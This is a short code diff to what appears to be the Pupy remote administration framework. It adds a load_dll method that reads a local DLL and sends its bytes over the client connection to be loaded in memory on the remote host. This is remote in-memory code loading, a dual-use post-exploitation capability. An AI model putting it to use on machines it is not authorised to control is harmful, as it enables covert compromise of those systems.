@@ -30,6 +30,7 @@ class PupyClient(object):
 		self.conn=self.desc["conn"]
 		self.pupsrv=pupsrv
 		self.load_pupyimporter()
+		self.imported_dlls={}
 
 	def __str__(self):
 		return "PupyClient(id=%s, user=%s, hostname=%s, platform=%s)"%(self.desc["id"], self.desc["user"], self.desc["hostname"], self.desc["platform"])
@@ -94,6 +95,20 @@ class PupyClient(object):
 				mod.install()
 				"""))
 			self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)
+
+	def load_dll(self, path):
+		""" 
+			load python dll like pywintypes27.dll necessary for some pywin32 .pyd to work
+		"""
+		name=os.path.basename(path)
+		if name in self.imported_dlls:
+			return
+		buf=b""
+		with open(path,'rb') as f:
+			buf=f.read()
+		if not self.conn.modules.pupy.load_dll(name, buf):
+			raise ImportError("load_dll: couldn't load %s"%name)
+		self.imported_dlls[name]=True
 
 	def load_package(self, module_name, force=False):
 		""" 
